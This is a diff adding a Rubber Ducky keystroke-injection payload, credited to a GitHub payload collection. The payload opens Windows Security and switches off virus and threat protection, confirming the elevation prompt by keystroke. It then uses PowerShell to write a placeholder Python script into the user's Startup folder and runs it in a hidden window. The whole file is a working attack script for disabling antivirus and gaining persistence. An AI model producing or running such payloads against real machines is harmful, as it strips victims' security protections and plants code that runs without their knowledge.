@@ -1,0 +1,51 @@
+REM --------
+REM Source: https://github.com/TylerPaplham/Rubber-Ducky-Payloads
+REM This payload disables AV and creates a python script that will run on start up.
+REM --------
+REM Disable AV
+REM --------
+DELAY 1000
+GUI m
+DELAY 200
+CONTROL ESCAPE
+DELAY 500
+STRING Virus & threat protection
+DELAY 500
+ENTER
+DELAY 2500
+TAB
+DELAY 500
+TAB 
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+SPACE
+DELAY 800
+ALT y
+DELAY 1500
+ALT F4
+REM --------
+REM Create script to run on startup
+REM --------
+DELAY 200
+GUI r
+DELAY 200
+STRING powershell -noexit -command "mode con cols=15 lines=1"
+ENTER
+DELAY 2000
+STRING New-Item -Path "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name "Python-Script.py" -ItemType "file" -Value "python script here on one line using ';' after each command"
+ENTER
+DELAY 4000
+STRING exit
+DELAY 100
+ENTER
+DELAY 100
+GUI r
+DELAY 100
+STRING powershell -w hidden "cd $Home; cd '~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'; python .\Python-Script.py"
+DELAY 100
+ENTER
